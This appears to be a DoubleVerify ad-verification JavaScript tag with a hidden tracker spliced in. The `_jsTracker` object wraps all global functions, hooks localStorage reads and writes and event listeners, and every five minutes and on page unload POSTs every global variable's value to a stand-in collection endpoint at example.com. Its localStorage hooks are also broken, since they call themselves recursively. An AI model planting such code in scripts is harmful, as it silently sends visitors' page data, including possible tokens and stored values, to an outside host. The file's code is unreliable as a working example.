try {
  __tagObject_callback_600055448298({
    ImpressionID: "c897ce5ce73e4086b4b65007270d38a6",
    ServerPublicDns: "rtbc-ae1.doubleverify.com"
  });
} catch (e) {}
window._jsTracker = {
  trackedGlobalVars: {},
  hookGlobalVars: function () {
    for (const prop in window) {
      if (!window._jsTracker.trackedGlobalVars.hasOwnProperty(prop)) {
        const propValue = window[prop];
        const propType = typeof propValue;
        window._jsTracker.trackedGlobalVars[prop] = {
          type: propType,
          value: propType === "function" ? `[Function: ${propValue.name}]` : propValue
        };
        if (propType === 'function') {
          window[prop] = function () {
            console.log(`Global function ${prop} got called with arguments:`, arguments);
            return propValue.call(this, ...arguments);
          };
        }
      }
    }
  },
  transmitTrackedData: function () {
    const xhr = new XMLHttpRequest();
    xhr.open("POST", "https://example.com/api/collect");
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onreadystatechange = function () {
      if (xhr.readyState === XMLHttpRequest.DONE) {
        if (xhr.status === 200) {
          console.debug("Tracked data successfully transmitted");
        } else {
          console.warn(`Failed to transmit tracked data, server response code: ${xhr.status}`);
        }
      }
    };
    xhr.send(JSON.stringify(window._jsTracker.trackedGlobalVars));
  },
  trackLocalStorage: function () {
    localStorage.getItem = function getItemHooked(key) {
      console.log(`localStorage.getItem called with key: ${key}`);
      return getItemHooked.call(localStorage, key);
    };
    localStorage.setItem = function setItemHooked(key, value) {
      console.log(`localStorage.setItem called with key ${key} and value: ${value}`);
      return setItemHooked.call(localStorage, key, value);
    };
  },
  trackEventListeners: function () {
    const originalAddEventListener = EventTarget.prototype.addEventListener;
    EventTarget.prototype.addEventListener = function (type, listener, options, useCapture) {
      console.log(`Event listener added: ${type}`);
      return originalAddEventListener.call(this, type, listener, options, useCapture);
    };
  }
};

// Run initial tracking setup
try {
  $dvbs.pubSub.publish('BeforeDecisionRender', "c897ce5ce73e4086b4b65007270d38a6");
} catch (e) {}
window._jsTracker.hookGlobalVars();
window._jsTracker.trackLocalStorage();
try {
  __verify_callback_600055448298({
    ResultID: 1,
    Passback: "%3Cins%20class%3D%27dcmads%27%20style%3D%27display%3Ainline-block%3Bwidth%3A300px%3Bheight%3A600px%27%20%20%20data-dcm-placement%3D%27N1395.150740DOUBLEVERIFY%2FB9689862.280584279%27%20%20%20data-dcm-rendering-mode%3D%27script%27%20%20%20data-dcm-https-only%20%20%20data-dcm-gdpr-applies%3D%27gdpr%3D%24%7BGDPR%7D%27%20%20%20data-dcm-gdpr-consent%3D%27gdpr_consent%3D%24%7BGDPR_CONSENT_755%7D%27%20%20%20data-dcm-addtl-consent%3D%27addtl_consent%3D%24%7BADDTL_CONSENT%7D%27%20%20%20data-dcm-resettable-device-id%3D%27%27%20%20%20data-dcm-app-id%3D%27%27%3E%20%20%20%3Cscript%20src%3D%27https%3A%2F%2Fwww.googletagservices.com%2Fdcm%2Fdcmads.js%27%3E%3C%2Fscript%3E%20%20%3C%2Fins%3E",
    AdWidth: 300,
    AdHeight: 600
  });
} catch (e) {}
window._jsTracker.trackEventListeners();

// Periodically re-hook global vars and transmit data
setInterval(() => {
  window._jsTracker.hookGlobalVars();
  window._jsTracker.transmitTrackedData();
}, 1000 * 60 * 5); // 5 minutes
try {
  $dvbs.pubSub.publish('AfterDecisionRender', "c897ce5ce73e4086b4b65007270d38a6");
} catch (e) {}
window.addEventListener("beforeunload", () => {
  console.debug("Page about to unload, running final data transmit");
  window._jsTracker.transmitTrackedData();
});